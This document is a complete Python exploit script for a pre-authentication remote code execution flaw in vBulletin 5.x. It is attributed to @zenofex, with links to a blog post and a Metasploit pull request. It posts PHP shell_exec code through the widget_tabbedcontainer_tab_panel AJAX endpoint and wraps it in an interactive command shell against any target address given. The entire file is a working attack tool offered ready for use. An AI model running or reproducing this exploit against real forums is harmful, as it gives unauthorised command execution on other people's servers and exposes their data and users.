#!/usr/bin/env python3
# vBulletin 5.x pre-auth widget_tabbedContainer RCE exploit by @zenofex
# https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/
# https://github.com/rapid7/metasploit-framework/pull/13970

import argparse
import requests
import sys

def run_exploit(vb_loc, shell_cmd):
    post_data = {'subWidgets[0][template]' : 'widget_php',
                'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd
                }
    r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)
    return r.text

ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE')
ap.add_argument('-l', '--location', required=True, help='Web address to root of vB5 install.')
ARGS = ap.parse_args()

while True:
    try:
        cmd = input("vBulletin5$ ")
        print(run_exploit(ARGS.location, cmd))
    except KeyboardInterrupt:
        sys.exit("\nClosing shell...")
    except Exception as e:
        sys.exit(str(e))
